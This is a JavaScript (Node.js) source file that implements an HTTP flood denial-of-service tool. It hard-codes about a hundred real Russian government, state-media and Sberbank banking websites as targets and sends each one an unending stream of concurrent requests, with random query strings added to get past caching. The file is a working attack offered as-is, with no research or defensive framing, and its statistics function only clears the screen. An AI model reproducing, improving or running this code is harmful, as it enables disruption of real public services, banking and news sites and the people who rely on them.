import fetch from "node-fetch";

const opts = {number_of_requests: 0, number_of_errored_responses: 0};
const targets = {
  'https://lenta.ru/': {...opts},
  'https://ria.ru/': {...opts},
  'https://ria.ru/lenta/': {...opts},
  'https://www.rbc.ru/': {...opts},
  'https://www.rt.com/': {...opts},
  'http://kremlin.ru/': {...opts},
  'http://en.kremlin.ru/': {...opts},
  'https://smotrim.ru/': {...opts},
  'https://tass.ru/': {...opts},
  'https://tvzvezda.ru/': {...opts},
  'https://vsoloviev.ru/': {...opts},
  'https://www.1tv.ru/': {...opts},
  'https://www.vesti.ru/': {...opts},
  'https://online.sberbank.ru/': {...opts},
  'https://sberbank.ru/': {...opts},
  'http://ach.gov.ru/': {...opts},
  'http://www.customs.ru/': {...opts},
  'http://www.economy.gov.ru/': {...opts},
  'http://www.fas.gov.ru/': {...opts},
  'http://www.fedsfm.ru/': {...opts},
  'http://www.gks.ru/': {...opts},
  'http://www.minfin.ru/': {...opts},
  'http://www.nalog.ru/': {...opts},
  'http://www.rosreestr.ru/': {...opts},
  'http://www.rosreserv.ru/': {...opts},
  'https://gosbar.gosuslugi.ru/': {...opts},
  'http://cikrf.ru/': {...opts},
  'http://council.gov.ru/': {...opts},
  'http://duma.gov.ru/': {...opts},
  'http://government.ru/': {...opts},
  'http://open.gov.ru/': {...opts},
  'http://www.gusp.gov.ru/': {...opts},
  'http://www.udprf.ru/': {...opts},
  'http://fapmc.ru/': {...opts},
  'http://rkn.gov.ru/': {...opts},
  'http://www.fso.gov.ru/': {...opts},
  'http://www.gfs.ru/': {...opts},
  'http://www.rossvyaz.ru/': {...opts},
  'https://digital.gov.ru/': {...opts},
  'http://fstec.ru/': {...opts},
  'http://rs.gov.ru/': {...opts},
  'http://www.fsvts.gov.ru/': {...opts},
  'http://www.mid.ru/': {...opts},
  'http://www.russiatourism.ru/': {...opts},
  'http://ombudsmanrf.org/': {...opts},
  'http://www.rosmintrud.ru/': {...opts},
  'http://www.rostrud.ru/': {...opts},
  'http://archives.ru/': {...opts},
  'http://fsa.gov.ru/': {...opts},
  'http://www.gost.ru/': {...opts},
  'http://fadm.gov.ru/': {...opts},
  'http://obrnadzor.gov.ru/': {...opts},
  'http://www.federalspace.ru/': {...opts},
  'http://www.mkrf.ru/': {...opts},
  'http://www.rupto.ru/': {...opts},
  'https://edu.gov.ru/': {...opts},
  'https://minobrnauki.gov.ru/': {...opts},
  'http://minvostokrazvitia.ru/': {...opts},
  'http://mil.ru/': {...opts},
  'http://nac.gov.ru/': {...opts},
  'http://svr.gov.ru/': {...opts},
  'http://www.fsb.ru/': {...opts},
  'http://www.mchs.gov.ru/': {...opts},
  'http://www.scrf.gov.ru/': {...opts},
  'http://rosavtodor.ru/': {...opts},
  'http://www.favt.ru/': {...opts},
  'http://www.mintrans.ru/': {...opts},
  'http://www.morflot.ru/': {...opts},
  'http://www.rostransnadzor.ru/': {...opts},
  'http://www.roszeldor.ru/': {...opts},
  'http://fsin.su/': {...opts},
  'http://genproc.gov.ru/': {...opts},
  'http://ksrf.ru/': {...opts},
  'http://mvd.ru/': {...opts},
  'http://rosgvard.ru/': {...opts},
  'http://www.fssprus.ru/': {...opts},
  'http://www.minjust.ru/': {...opts},
  'https://xn--b1ab2a0a.xn--b1aew.xn--p1ai/': {...opts},
  'http://rpn.gov.ru/': {...opts},
  'http://voda.mnr.gov.ru/': {...opts},
  'http://www.fishcom.ru/': {...opts},
  'http://www.fsvps.ru/': {...opts},
  'http://www.gosnadzor.ru/': {...opts},
  'http://www.mcx.ru/': {...opts},
  'http://www.meteorf.ru/': {...opts},
  'http://www.mnr.gov.ru/': {...opts},
  'http://www.rosleshoz.gov.ru/': {...opts},
  'http://www.rosnedra.gov.ru/': {...opts},
  'http://fmbaros.ru/': {...opts},
  'http://rosminzdrav.ru/': {...opts},
  'http://rospotrebnadzor.ru/': {...opts},
  'http://www.minsport.gov.ru/': {...opts},
  'http://www.roszdravnadzor.ru/': {...opts},
  'http://minenergo.gov.ru/': {...opts},
  'http://www.minpromtorg.gov.ru/': {...opts},
  'http://www.minstroyrf.ru/': {...opts},
  'http://data.gov.ru/': {...opts},
  'http://partners.gosuslugi.ru/': {...opts},
  'http://www.gosuslugi.ru/': {...opts},
};

const printStats = () => {
  process.stdout.write("\u001b[3J\u001b[2J\u001b[1J");
};
setInterval(printStats, 1000);

const CONCURRENCY_LIMIT = 1000;
const queue = [];

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
  });
}

const flood = async (target) => {
  for (let i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    const rand = i % 13 === 0 ? '' : ('?' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
    queue.push(
      fetchWithTimeout(target + rand, {timeout: 2500})
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText;
          }
          targets[target].number_of_requests++;
        })
    )
  }
};

// Start
Object.keys(targets).map(flood);
